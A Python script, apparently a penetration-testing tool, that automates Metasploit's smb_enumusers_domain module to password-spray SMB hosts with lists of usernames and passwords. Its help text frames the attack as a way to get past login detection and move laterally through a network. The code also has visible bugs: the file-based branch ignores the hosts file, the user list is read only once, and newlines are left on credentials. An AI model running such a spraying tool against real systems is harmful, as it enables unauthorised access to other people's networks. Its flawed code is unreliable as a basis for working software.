#!/usr/bin/env python3
import argparse,sys,subprocess,shlex,time,os

def exploit_smb(user,passwd,host):
	file1 = open('SMB_exploit.rc','w')
	file1.write('use auxiliary/scanner/smb/smb_enumusers_domain'+'\n')
	file1.write('set RHOSTS '+host+'\n'+'set SMBDomain WORKGROUP'+'\n')
	file1.write('set SMBPass '+passwd+'\n'+'set SMBUser '+user+'\n')
	file1.write('run'+'\n'+'exit')
	file1.close()
	command = 'msfconsole -r SMB_exploit.rc'
	command = shlex.split(command)
	c1 = subprocess.Popen(command)
	time.sleep(15.5)

def main_arguments():
	usage = '\n'+'Metasploit and python3.x must be installed to use this program. Two files, one with usernames and the other with passwords\
 must be passed to the arguments, instead of files lists can also be specified directly in the command line.\
 See all the options for more details. Using the smb_enumusers_domain exploit, this program will try to\
 access the SMB(Server Message Block) host and get the current username that is logged in to allow the Pentester to make a lateral move\
 or perhaphs vertical move in the network.The programs IPv4_Port_scanner.py or IPv6_Port_scanner.py\
 could be run to check if there are any hosts on the network who have SMB service on(usually the service is on port 445).'
	epilog = "A spray attack will be used to prevent systems that detect logins using the same username multiple times in a short time.\
 If only a user is specified and various passwords are specified, a spray attack won't have any effect. Each host will be attacked by the order you\
 specified them. The program must have permission to be executable, after that you can run it"+'\n'+\
 sys.argv[0]+" [OPTION]...[ARGUMENTS]"+ " :Examples: "+'\n'+"'"+"sudo "+sys.argv[0]+" Fhosts hosts_file.txt -Funames file1.txt -Fpasswds file2.txt"+"'"+'\n'+\
 "'"+sys.argv[0]+" -Hosts 192.x.x.34,192.x.x.31,192.x.x.23 -Unames user1,user2,user3 -Pwords pass1,pass2,pass3"+"'"+" sudo must be used if not root."
	parser = argparse.ArgumentParser(usage=usage,epilog=epilog)
	parser.add_argument('-Fhosts',help='File with hosts that have SMB service on.')
	parser.add_argument('-Hosts',help='Hosts passed directly to the command line.',nargs='+')
	parser.add_argument('-Funames',help='File with usernames. One username per line.')
	parser.add_argument('-Fpasswds',help='File with passwords. One password per line')
	parser.add_argument('-Unames',help='Usernames passed directly in the command line',nargs='+')
	parser.add_argument('-Pwords',help='Passwords passed directly in the command line',nargs='+')
	arguments, unknown_arguments = parser.parse_known_args()
	if unknown_arguments:
		print('[!]Unknown arguments specified use --help for instructions, details:')
		sys.exit(unknown_arguments)
	elif arguments.Funames and arguments.Fpasswds and arguments.Fhosts :
		passfile,userfile = open(arguments.Fpasswds,'r'),open(arguments.Funames,'r')
		lines_passwrd,lines_user = passfile.readlines(),open(arguments.Funames,'r')
		passfile.close()
		userfile.close()
		for host in arguments.Hosts:
			for line1 in lines_passwrd:
				for line2 in lines_user:
					exploit_smb(line2,line1,host)
		os.remove('SMB_exploit.rc')
	elif (arguments.Funames and not arguments.Fpasswds) or (arguments.Fpasswds and not arguments.Funames):
		print('[!]Not all necessary arguments specified use --help for instructions')
		sys.exit(0)
	elif arguments.Unames and arguments.Pwords and arguments.Hosts:
		for host in arguments.Hosts:
			for passwd in arguments.Pwords:
				for username in arguments.Unames:
					exploit_smb(username,passwd,host)
		os.remove('SMB_exploit.rc')
	elif (arguments.Unames and not arguments.Pwords) or (arguments.Pwords and not arguments.Unames):
		print('[!]Not all necessary arguments specified use --help for instructions')
		sys.exit(0)		


main_arguments()